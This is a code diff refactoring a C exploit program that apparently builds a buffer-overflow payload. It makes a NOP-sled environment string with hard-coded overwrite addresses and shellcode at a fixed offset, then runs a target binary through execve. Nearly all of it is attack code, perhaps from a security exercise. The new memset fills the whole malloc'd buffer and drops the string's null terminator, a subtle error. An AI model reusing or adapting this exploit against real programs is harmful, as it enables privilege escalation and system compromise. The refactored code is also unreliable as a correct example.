@@ -12,17 +12,12 @@ const int SHELLCODE_OFFSET = 201;
 const uint32_t BASE_ADDRESS = 0xffffdec0;
 
 void prepareEnvironment(char *environment) {
-    int i;
-    for (i = 0; i < BUFFER_SIZE - 1; i++) {
-        environment[i] = 0x90;
-    }
+    memset(environment, 0x90, BUFFER_SIZE);
 
     *((uint32_t *)(environment)) = BASE_ADDRESS + 4;
     *((uint32_t *)(environment + 4)) = BASE_ADDRESS + 8;
 
-    for (i = SHELLCODE_OFFSET; i < SHELLCODE_OFFSET + sizeof(shellcode); i++) {
-        environment[i] = shellcode[i - SHELLCODE_OFFSET];
-    }
+    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));
 }
 
 int main(void)
@@ -32,12 +27,15 @@ int main(void)
         "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
         NULL
     };
-    char environment[BUFFER_SIZE] = {0};
+
+    char *environment = (char *)malloc(BUFFER_SIZE);
     prepareEnvironment(environment);
+
     char *env[] = {environment, NULL};
 
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
 
+    free(environment);
     return 0;
 }
